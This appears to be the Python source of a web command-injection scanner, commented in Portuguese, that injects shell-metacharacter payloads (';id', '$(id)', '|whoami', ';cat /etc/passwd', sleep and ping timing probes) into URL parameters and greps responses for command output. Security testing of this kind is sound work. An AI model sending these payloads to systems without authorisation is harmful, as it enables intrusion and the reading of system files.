"""
Scanner de Injeção de Comando — Vlad Volkov
Detecta vulnerabilidades de Command Injection em parâmetros.
"""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Optional

from rich.console import Console
from rich.table import Table
from rich import box

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    pass

console = Console()

# Payloads de injeção de comando
PAYLOADS_CMD = {
    "linux": [
        ";id",
        "|id",
        "||id",
        "&id",
        "&&id",
        ";whoami",
        "`id`",
        "$(id)",
        ";cat /etc/passwd",
        "\nid\n",
    ],
    "windows": [
        "&whoami",
        "&&whoami",
        "|whoami",
        "||whoami",
        ";whoami",
        "&dir",
    ],
    "blind_linux": [
        ";sleep 3",
        "|sleep 3",
        "&&sleep 3",
        "$(sleep 3)",
        "`sleep 3`",
    ],
    "blind_windows": [
        "&ping -n 4 127.0.0.1",
        "&&ping -n 4 127.0.0.1",
        "|ping -n 4 127.0.0.1",
    ],
}

# Indicadores de injeção de comando bem-sucedida
INDICADORES_CMD = [
    r"uid=\d+.*gid=\d+",          # output de id
    r"root:.*:0:0:",               # /etc/passwd
    r"www-data",                   # usuário web comum
    r"daemon",
    r"apache",
    r"nginx",
    r"Administrator",              # Windows
    r"Directory of",               # Windows dir
    r"Volume in drive",            # Windows
]

TEMPO_BASELINE = None
LIMIAR_TEMPO = 2.5  # segundos acima do baseline para blind injection


class ScannerInjecaoCmd:
    """Detecta vulnerabilidades de Command Injection."""

    def __init__(self, timeout: int = 12, verificar_ssl: bool = False):
        self.timeout = timeout
        self.verificar_ssl = verificar_ssl
        self.sessao = requests.Session()
        self.sessao.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.vulnerabilidades = []

    def _requisicao_temporizada(self, url: str):
        import time as t
        inicio = t.time()
        try:
            resp = self.sessao.get(url, timeout=self.timeout, verify=self.verificar_ssl)
            duracao = t.time() - inicio
            return resp, duracao
        except Exception:
            return None, t.time() - inicio

    def _url_com_param(self, url: str, param: str, valor: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [valor]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _detectar_output(self, resposta) -> Optional[str]:
        if resposta is None:
            return None
        corpo = resposta.text
        for indicador in INDICADORES_CMD:
            if re.search(indicador, corpo, re.IGNORECASE):
                return indicador
        return None

    def escanear(self, url: str, verboso: bool = True) -> List[dict]:
        """Executa scan de injeção de comando."""
        self.vulnerabilidades = []

        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())

        if not params:
            return []

        if verboso:
            console.print(f"  [cyan]→[/cyan] Testando Command Injection em: {url[:60]}")

        for param in params:
            # Teste de output direto
            for categoria in ["linux", "windows"]:
                for payload in PAYLOADS_CMD[categoria][:4]:
                    url_teste = self._url_com_param(url, param, payload)
                    resp, _ = self._requisicao_temporizada(url_teste)
                    indicador = self._detectar_output(resp)

                    if indicador:
                        self.vulnerabilidades.append({
                            "tipo": "Command Injection",
                            "parametro": f"{param} (GET)",
                            "payload": payload,
                            "indicador": indicador,
                            "metodo": "output direto",
                            "severidade": "critico",
                        })
                        break

                    time.sleep(0.15)

                if any(v["parametro"] == f"{param} (GET)" for v in self.vulnerabilidades):
                    break

        if verboso:
            if self.vulnerabilidades:
                console.print(
                    f"  [bold red]✓ Command Injection encontrado![/bold red] "
                    f"{len(self.vulnerabilidades)} vulnerabilidade(s)"
                )
            else:
                console.print("  [dim]✗ Nenhum Command Injection detectado[/dim]")

        return self.vulnerabilidades
